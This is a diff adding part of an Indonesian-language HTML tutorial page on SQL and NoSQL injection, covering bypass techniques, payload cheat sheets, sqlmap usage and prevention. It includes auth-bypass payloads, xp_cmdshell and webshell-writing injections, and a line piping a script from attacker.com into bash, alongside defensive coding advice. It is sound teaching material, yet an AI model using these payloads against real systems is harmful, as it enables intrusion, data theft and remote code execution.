+                            <td><code>{"field": {"$ne": "value"}}</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>$gt / $gte</code></td>
+                            <td>Greater Than / Equal</td>
+                            <td><code>{"field": {"$gt": 0}}</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>$lt / $lte</code></td>
+                            <td>Less Than / Equal</td>
+                            <td><code>{"field": {"$lt": 999}}</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>$regex</code></td>
+                            <td>Regular Expression</td>
+                            <td><code>{"field": {"$regex": "^a"}}</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>$exists</code></td>
+                            <td>Field Exists</td>
+                            <td><code>{"field": {"$exists": true}}</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>$where</code></td>
+                            <td>JavaScript Expression</td>
+                            <td><code>{"$where": "this.a > this.b"}</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>$in</code></td>
+                            <td>In Array</td>
+                            <td><code>{"field": {"$in": ["a","b"]}}</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>$nin</code></td>
+                            <td>Not In Array</td>
+                            <td><code>{"field": {"$nin": ["a","b"]}}</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- Advanced Techniques -->
+            <section id="techniques">
+                <h2>Teknik Lanjutan</h2>
+
+                <h3>Filter Bypass Techniques</h3>
+                <pre><code>-- Case variation
+SeLeCt * FrOm users
+
+-- URL encoding
+%53%45%4c%45%43%54
+
+-- Double URL encoding
+%2533%2545%254c%2545%2543%2554
+
+-- SQL comments untuk bypass
+SEL/**/ECT * FR/**/OM users
+
+-- Newline characters
+SEL%0aECT * FR%0aOM users
+
+-- Hex encoding
+SELECT * FROM users WHERE name=0x61646d696e
+
+-- CHAR() function
+SELECT * FROM users WHERE name=CHAR(97,100,109,105,110)
+
+-- MySQL version comments
+/*!50000SELECT*/ * FROM users  -- Executed if MySQL >= 5.00.00</code></pre>
+
+                <h3>Comment Syntax per Database</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Database</th>
+                            <th>Comment Syntax</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Oracle</td>
+                            <td><code>--comment</code></td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td><code>--comment</code> dan <code>/*comment*/</code></td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td><code>--comment</code> dan <code>/*comment*/</code></td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td><code>#comment</code>, <code>-- comment</code> (dengan spasi), <code>/*comment*/</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Stacked (Batched) Queries</h3>
+                <pre><code>-- SQL Server - Support penuh
+'; DROP TABLE users; EXEC xp_cmdshell('dir');--
+
+-- PostgreSQL - Support
+'; DROP TABLE users; SELECT * FROM admins;--
+
+-- MySQL - Tidak semua driver support
+'; DROP TABLE users;--
+
+-- Oracle - Tidak support batched queries</code></pre>
+
+                <h3>Privilege Escalation & RCE</h3>
+                <pre><code>-- SQL Server - Enable xp_cmdshell
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
+'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+'; EXEC xp_cmdshell('whoami');--
+
+-- MySQL - Read files (FILE privilege)
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+
+-- MySQL - Write webshell
+' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+
+-- PostgreSQL - Copy to program
+'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh|bash';--</code></pre>
+
+                <h3>WAF Bypass</h3>
+                <pre><code>-- HTTP Parameter Pollution
+id=1&id=2&id=3' OR '1'='1
+
+-- Unicode normalization
+%C0%A0 (non-breaking space)
+
+-- JSON injection
+{"id": "1 OR 1=1--"}
+
+-- Alternative whitespace
+%09 (tab), %0a (newline), %0d (CR), %0c (form feed)
+
+-- Null bytes
+%00' OR 1=1--</code></pre>
+            </section>
+
+            <!-- Second-Order SQLi -->
+            <section id="second-order">
+                <h2>Second-Order SQL Injection</h2>
+                <p>Menurut <strong>PortSwigger</strong>, Second-Order SQL Injection terjadi ketika aplikasi mengambil input user dari HTTP request dan menyimpannya untuk penggunaan di masa depan (biasanya di database), tanpa kerentanan terjadi pada saat penyimpanan data.</p>
+
+                <p>Kemudian, ketika menangani HTTP request yang berbeda, aplikasi mengambil data yang tersimpan dan memasukkannya ke dalam query SQL dengan cara yang tidak aman. Developer salah menganggap data tersebut sudah "trusted" karena sebelumnya disimpan dengan aman.</p>
+
+                <div class="example-box">
+                    <h4>Contoh Second-Order SQLi:</h4>
+                    <pre><code>-- Step 1: Register dengan username yang mengandung payload
+Username: admin'--
+
+-- Data disimpan di database tanpa masalah
+
+-- Step 2: Admin melihat user list atau melakukan operasi lain
+-- Query yang dijalankan:
+SELECT * FROM users WHERE username = 'admin'--'
+
+-- Payload dieksekusi pada query kedua!</code></pre>
+                </div>
+            </section>
+
+            <!-- Cheat Sheet -->
+            <section id="cheatsheet">
+                <h2>SQLi Cheat Sheet (PortSwigger)</h2>
+
+                <h3>Database Version Detection</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Database</th>
+                            <th>Query</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Oracle</td>
+                            <td><code>SELECT banner FROM v$version</code></td>
+                        </tr>
+                        <tr>
+                            <td>Oracle</td>
+                            <td><code>SELECT version FROM v$instance</code></td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td><code>SELECT @@version</code></td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td><code>SELECT version()</code></td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td><code>SELECT @@version</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Database Contents</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Database</th>
+                            <th>List Tables</th>
+                            <th>List Columns</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Oracle</td>
+                            <td><code>SELECT * FROM all_tables</code></td>
+                            <td><code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'</code></td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td><code>SELECT * FROM information_schema.tables</code></td>
+                            <td><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'</code></td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td><code>SELECT * FROM information_schema.tables</code></td>
+                            <td><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'</code></td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td><code>SELECT * FROM information_schema.tables</code></td>
+                            <td><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- Payload Collections -->
+            <section id="payloads">
+                <h2>Kumpulan Payload</h2>
+
+                <h3>Authentication Bypass</h3>
+                <pre><code>' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin'#
+admin'/*
+' or 1=1--
+' or 1=1#
+') or '1'='1--
+') or ('1'='1--
+" or "1"="1
+" or 1=1--
+'||'1'='1
+' or ''='
+' or 'x'='x
+1'1
+1'1'1</code></pre>
+
+                <h3>ORDER BY & GROUP BY Injection</h3>
+                <pre><code>' ORDER BY 1--
+' ORDER BY 999--
+' ORDER BY (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' GROUP BY 1--
+' SORT BY (CASE WHEN (1=1) THEN column1 ELSE column2 END)--</code></pre>
+
+                <h3>INSERT Injection</h3>
+                <pre><code>', (SELECT password FROM users WHERE username='admin'), '1')--
+', (SELECT version()), 1)--
+', EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)), '1')--</code></pre>
+
+                <h3>Common Encodings</h3>
+                <pre><code>-- URL Encoding
+' = %27   " = %22   # = %23   ; = %3B   Space = %20
+
+-- Double URL Encoding
+' = %2527   " = %2522   Space = %2520
+
+-- Hex Encoding
+' = 0x27   admin = 0x61646d696e
+
+-- HTML Entity
+' = &#39; atau &apos;   " = &#34; atau &quot;</code></pre>
+            </section>
+
+            <!-- Tools -->
+            <section id="tools">
+                <h2>Tools untuk SQL Injection</h2>
+
+                <div class="card-grid">
+                    <div class="card">
+                        <h3><span class="badge badge-success">Recommended</span> SQLMap</h3>
+                        <p>Tool otomatis paling populer untuk SQL injection detection dan exploitation.</p>
+                        <pre><code># Basic usage
+sqlmap -u "http://target.com?id=1"
+
+# POST data
+sqlmap -u "http://target.com/login" \
+  --data="user=admin&pass=test"
+
+# Specify parameter
+sqlmap -u "http://target.com?id=1&cat=2" -p id
+
+# With cookie
+sqlmap -u "http://target.com?id=1" \
+  --cookie="session=abc123"
+
+# Dump all databases
+sqlmap -u "http://target.com?id=1" --dbs
+
+# Dump tables
+sqlmap -u "http://target.com?id=1" \
+  -D dbname --tables
+
+# Dump data
+sqlmap -u "http://target.com?id=1" \
+  -D dbname -T users --dump
+
+# OS shell
+sqlmap -u "http://target.com?id=1" --os-shell
+
+# Level dan risk
+sqlmap -u "http://target.com?id=1" \
+  --level=5 --risk=3
+
+# Specific technique
+sqlmap -u "http://target.com?id=1" \
+  --technique=BEUST
+# B=Boolean E=Error U=Union S=Stacked T=Time</code></pre>
+                    </div>
+
+                    <div class="card">
+                        <h3><span class="badge badge-success">Recommended</span> Burp Suite</h3>
+                        <p>Web proxy dengan SQL injection scanner dan Intruder untuk manual testing. Termasuk Burp Collaborator untuk OAST testing.</p>
+                    </div>
+
+                    <div class="card">
+                        <h3><span class="badge badge-info">NoSQL</span> NoSQLMap</h3>
+                        <p>Tool khusus untuk NoSQL injection (MongoDB, CouchDB).</p>
+                        <pre><code>python nosqlmap.py
+python nosqlmap.py --attackMode 1 --victimHost target.com</code></pre>
+                    </div>
+
+                    <div class="card">
+                        <h3><span class="badge badge-info">GUI</span> jSQL Injection</h3>
+                        <p>Tool Java-based dengan GUI untuk SQL injection.</p>
+                    </div>
+                </div>
+
+                <h3>SQLMap Tamper Scripts</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Script</th>
+                            <th>Fungsi</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>space2comment</code></td>
+                            <td>Ganti spasi dengan <code>/**/</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>between</code></td>
+                            <td>Ganti <code>&gt;</code> dengan <code>NOT BETWEEN 0 AND</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>randomcase</code></td>
+                            <td>Random case untuk bypass case-sensitive filter</td>
+                        </tr>
+                        <tr>
+                            <td><code>base64encode</code></td>
+                            <td>Base64 encoding payload</td>
+                        </tr>
+                        <tr>
+                            <td><code>charencode</code></td>
+                            <td>URL encode semua karakter</td>
+                        </tr>
+                        <tr>
+                            <td><code>equaltolike</code></td>
+                            <td>Ganti <code>=</code> dengan <code>LIKE</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>space2plus</code></td>
+                            <td>Ganti spasi dengan <code>+</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Manual Testing Checklist</h3>
+                <div class="info-box">
+                    <ol>
+                        <li>Identifikasi semua input points (URL params, forms, headers, cookies)</li>
+                        <li>Test dengan single quote <code>'</code> - cari error atau perubahan response</li>
+                        <li>Test dengan <code>' OR '1'='1</code> untuk auth bypass</li>
+                        <li>Test dengan <code>' AND '1'='2</code> untuk blind detection</li>
+                        <li>Determine column count dengan ORDER BY atau UNION NULL</li>
+                        <li>Identify visible columns</li>
+                        <li>Enumerate database info (version, user, database name)</li>
+                        <li>Enumerate tables dan columns</li>
+                        <li>Extract data</li>
+                        <li>Test stacked queries jika applicable</li>
+                        <li>Test file operations (read/write) jika privilege tinggi</li>
+                    </ol>
+                </div>
+            </section>
+
+            <!-- Prevention -->
+            <section id="prevention">
+                <h2>Pencegahan SQL Injection</h2>
+
+                <div class="warning-box">
+                    <strong>OWASP Warning:</strong> Escaping input dan stored procedures TIDAK cukup untuk mencegah semua jenis SQL injection. Metode yang disarankan adalah <strong>Parameterized Queries (Prepared Statements)</strong>.
+                </div>
+
+                <h3>1. Parameterized Queries (Prepared Statements)</h3>
+                <p>Menurut <strong>PortSwigger</strong>, sebagian besar besar SQL injection dapat dicegah menggunakan parameterized queries sebagai pengganti string concatenation.</p>
+
+                <pre><code>// PHP - PDO (RECOMMENDED)
+$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
+$stmt->execute([$username, $password]);
+
+// PHP - MySQLi
+$stmt = $conn->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
+$stmt->bind_param('ss', $username, $password);
+$stmt->execute();
+
+// Python - psycopg2
+cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (username, password))
+
+// Java - JDBC
+PreparedStatement stmt = conn.prepareStatement('SELECT * FROM users WHERE username = ? AND password = ?');
+stmt.setString(1, username);
+stmt.setString(2, password);
+
+// Node.js - mysql2
+const [rows] = await connection.execute('SELECT * FROM users WHERE username = ? AND password = ?', [username, password]);</code></pre>
+
+                <div class="info-box">
+                    <strong>PortSwigger:</strong> Parameterized queries bisa digunakan untuk situasi di mana untrusted input muncul sebagai data dalam query. TIDAK bisa digunakan untuk table/column names atau ORDER BY clause - perlu pendekatan berbeda seperti whitelisting.
+                </div>
+
+                <h3>2. Input Validation (Whitelist)</h3>
+                <pre><code>// Whitelist validation
+if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
+    die('Invalid username');
+}
+
+// Type casting untuk numeric
+$id = (int) $_GET['id'];
+
+// PHP filter functions
+$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
+$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);</code></pre>
+
+                <h3>3. Least Privilege Database User</h3>
+                <pre><code>-- Jangan gunakan root/sa untuk aplikasi!
+CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'strong_password';
+GRANT SELECT, INSERT, UPDATE ON appdb.* TO 'appuser'@'localhost';
+-- Jangan berikan DROP, DELETE, atau FILE privilege</code></pre>
+
+                <h3>4. Additional Defenses</h3>
+                <ul>
+                    <li><strong>Disable error messages</strong> - Jangan tampilkan error database ke user</li>
+                    <li><strong>WAF</strong> - Web Application Firewall untuk filter dasar</li>
+                    <li><strong>Rate limiting</strong> - Limit requests untuk mencegah blind SQLi brute force</li>
+                    <li><strong>Logging & Monitoring</strong> - Monitor untuk suspicious patterns</li>
+                </ul>
+
+                <h3>NoSQL Prevention</h3>
+                <pre><code>// MongoDB - Sanitize operator
+const sanitize = (input) => {
+    if (typeof input === 'object') {
+        for (let key in input) {
+            if (key.startsWith('$')) {
+                delete input[key];
+            }
+        }
+    }
+    return input;
+};
+
+// Express middleware
+const mongoSanitize = require('express-mongo-sanitize');
+app.use(mongoSanitize());
+
+// Disable $where jika tidak diperlukan
+db.adminCommand({ setParameter: 1, javascriptEnabled: false })</code></pre>
+            </section>
+
+            <!-- References -->
+            <section>
+                <div class="info-box">
+                    <h3>Referensi Utama</h3>
+                    <ul>
+                        <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger Web Security Academy - SQL Injection</a></li>
+                        <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank">PortSwigger SQL Injection Cheat Sheet</a></li>
+                        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP - SQL Injection</a></li>
+                        <li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank">SQLMap GitHub</a></li>
+                        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">PayloadsAllTheThings</a></li>
+                        <li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection" target="_blank">HackTricks - SQL Injection</a></li>
+                    </ul>
+                </div>
+            </section>
+        </main>
+    </div>
+</body>
+</html>
